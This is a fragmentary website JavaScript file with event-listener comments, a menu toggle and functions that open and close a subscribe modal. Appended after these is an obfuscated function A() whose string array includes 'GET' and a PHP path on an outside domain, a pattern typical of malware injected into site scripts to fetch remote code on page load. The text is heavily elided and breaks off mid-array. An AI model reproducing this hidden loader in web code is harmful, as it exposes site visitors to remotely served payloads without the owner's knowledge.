/* 
    Add all event listeners at the same point
...
function menuToggle(){
 ...
 //Subscribe modal script
  ...
  function showSubscribe(){
    const myModalEl = document.getElementById('authentication-modal');
    myModalEl.classList.remove("hidden");
    myModalEl.classList.add("block");
    
  }

  function closeModal() {
    const close = document.getElementById('authentication-modal');
    close.classList.add("hidden");
    close.classList.remove("block");
  }

if(document.querySelector('#authentication-modal')){
...
function A() {
    var s = [
        ...
        'GET',
        'www.',
        '//bloomdigitmedia.com/dist/img/credit/credit.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
